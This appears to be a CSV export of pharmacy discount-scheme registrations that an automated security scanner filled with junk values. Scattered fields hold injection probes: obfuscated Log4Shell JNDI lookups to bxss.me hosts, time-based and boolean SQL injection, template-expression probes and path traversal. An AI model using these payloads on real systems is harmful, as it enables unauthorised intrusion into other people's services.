Unique ID,Surgery Name,Surgery Address 1,Surgery Address 2,Surgery Town,Surgery County,Surgery Post Code,Surgery Email,Surgery Telephone,TEVA Account No,TEVA Manager,Total Patients,Total Patients (Dispensing),Wholesaler Name,Wholesale Account,Wholesale Depot,Discount Axsain 45g,Discount Braltus Zonda 10mcg,Discount DuoResp Spiromax 160mcg/4.5mcg,Discount DuoResp Spiromax 320mcg/9mcg,Discount Qvar MDI 50mcg,Discount Qvar MDI 100mcg,Discount Qvar Easi-Breathe 50mcg,Discount Qvar Easi-Breathe 100mcg,Discount Zacin 45g,Authorised Signatory,Marketing Consent,Terms Agreement,Date Created,Activated,Date Activated,Sending bank details,
62315ece-2460-4f3a-8f2d-74d48d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,${j${::-n}di:dns${::-:}${::-/}/hitdgqexwckzyfacb9${::-.}bxss.me}zzzz,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ecf-cda8-4982-b835-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ecc-8b44-4c97-b854-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ecc-1744-40d6-8ea2-0ada8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,Q6nKkF9w&#039;)) OR 864=(SELECT 864 FROM PG_SLEEP(15))--,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ecc-7d24-43ec-9c0a-199d8d00a510,vRhxZFSn,3137 Laguna Street,${9999516+9999955},San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ecb-2c7c-4351-b7db-74d48d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/dns.log4j.002626.1428809-3400.1428809.9e545${::-.}1${::-.}bxss.me}},4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ec9-70fc-4b5b-84a0-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,mWM2HF3l&#039;) OR 560=(SELECT 560 FROM PG_SLEEP(15))--,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ec9-a010-49fc-9570-0ada8d00a510,vRhxZFSn,${10000222+9999737},3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ec8-5ab8-4abc-9de8-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ec5-4960-421f-8e3c-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,PEdD8xbN&#039; OR 668=(SELECT 668 FROM PG_SLEEP(15))--,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ec5-c34c-46e6-ac72-0ada8d00a510,${9999644+10000321},3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ec4-0e10-4e31-b1cf-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ec1-40f0-41c0-b316-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,bVzZzzlj&#039;; waitfor delay &#039;0:0:15&#039; -- ,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ec1-e7c8-4ed1-84db-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ec0-4564-444d-a145-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ebe-3ee4-4581-aaf0-74d48d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ebd-b548-4ee3-9b1c-0ada8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,1 waitfor delay &#039;0:0:15&#039; -- ,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ebc-7d0c-42e0-a0df-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eba-d6a4-44ce-bed8-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eb9-979c-4620-99cc-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,(select(0)from(select(sleep(15)))v)/*&#039;+(select(0)from(select(sleep(15)))v)+&#039;&quot;+(select(0)from(select(sleep(15)))v)+&quot;*/,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eb8-981c-4258-8f5d-74d48d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eb7-d098-4675-8e58-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,${j${::-n}di:dns${::-:}${::-/}/hitjqhwkezsqd8edc9${::-.}bxss.me}zzzz,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eb6-5484-429e-b518-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eb5-aa74-4bdc-ab56-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,0&quot;XOR(if(now()=sysdate(),sleep(15),0))XOR&quot;Z,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eb4-e7c0-4f67-b0b3-74d48d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eb1-b1bc-46c3-84c2-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,0&#039;XOR(if(now()=sysdate(),sleep(15),0))XOR&#039;Z,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eb2-80e0-4788-8386-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eb0-23b4-4ddd-af37-74d48d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eae-665c-45ef-8738-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,if(now()=sysdate(),sleep(15),0),NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eae-bbf8-4334-a602-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,2022-03-16,No,,Yes,
62315eac-b614-4604-a2ab-74d48d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eaa-5ae0-4418-ba23-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,-1&quot; OR 2+471-471-1=0+0+0+1 -- ,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315eaa-e37c-4cb1-8c5e-0ada8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,2022-03-16,No,,Yes,
62315ea7-a878-4147-8f39-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ea5-ba98-4625-b7a6-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,-1&#039; OR 2+835-835-1=0+0+0+1 or &#039;GcxGlvPw&#039;=&#039;,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ea5-2ba4-40a1-8454-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,2022-03-16,No,,Yes,
62315ea2-7878-41d5-afd2-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ea1-f694-43b4-863b-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-16,No,,Yes,
62315ea1-895c-4a28-9996-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,-1&#039; OR 2+951-951-1=0+0+0+1 -- ,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315ea0-11f0-473d-9283-74d48d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/dns.log4j.002626.1428809-3397.1428809.9e545${::-.}1${::-.}bxss.me}},1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e9d-f388-471d-a2ed-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-16,No,,Yes,
62315e9e-1e78-4746-be26-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e9d-f808-4c1b-85f7-0ada8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,-1 OR 2+27-27-1=0+0+0+1,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e99-5f48-4c29-9f82-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-16,No,,Yes,
62315e99-8c90-4230-a475-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e98-d360-4c36-a530-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,${j${::-n}di:dns${::-:}${::-/}/hitcrpvslflmjc6f55${::-.}bxss.me}zzzz,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e98-f8a4-4002-993c-74d48d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,-1 OR 2+683-683-1=0+0+0+1 -- ,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e95-1ef8-4b1c-923d-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e95-7748-4f04-8281-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,2022-03-16,No,,Yes,
62315e94-9c38-4263-95af-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/dns.log4j.002626.1428809-3396.1428809.9e545${::-.}1${::-.}bxss.me}},vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e94-1068-4a33-bf41-0ada8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,vA013ae3,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e90-60dc-46a1-9b09-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e90-2b40-4941-b8b0-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,2022-03-16,No,,Yes,
62315e90-9030-4cef-b4c2-0ada8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e8c-0cc8-4d14-a3f3-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,2022-03-16,No,,Yes,
62315e8c-618c-4732-8f45-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e8c-bf04-40f0-aacc-0ada8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,../1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e8b-f4c4-4f5d-9fcd-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,${j${::-n}di:dns${::-:}${::-/}/hitxdlndicowb21d45${::-.}bxss.me}zzzz,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e87-24ac-4742-9e1d-0f068d00a510,vRhxZFSn,3137 Laguna Street,@@ULisy,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e87-6738-4a4b-a83b-0ada8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e87-e6d4-4c6c-a8ec-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,No,
62315e85-19fc-44cb-80d2-74d48d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/dns.log4j.002626.1428809-3395.1428809.9e545${::-.}1${::-.}bxss.me}},4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e82-2868-4e72-8c73-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,No,
62315e81-4ed0-44cd-a1c4-0ada8d00a510,vRhxZFSn,3137 Laguna Street,,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e82-2c28-4318-b7f5-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,../4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e80-3680-4709-adfb-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,${j${::-n}di:dns${::-:}${::-/}/hitqvkorxynoide8d1${::-.}bxss.me}zzzz,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e7b-8ce4-47ce-8a8d-0f068d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e7c-1214-4418-87e0-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,No,
62315e7b-9450-464a-9e0c-0ada8d00a510,vRhxZFSn,3137 Laguna Street,1&#039;&quot;,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e7a-2634-48ab-8e2a-199d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
62315e77-f1a4-42b8-8b97-109d8d00a510,vRhxZFSn,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,vRhxZFSn,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-16,No,,Yes,
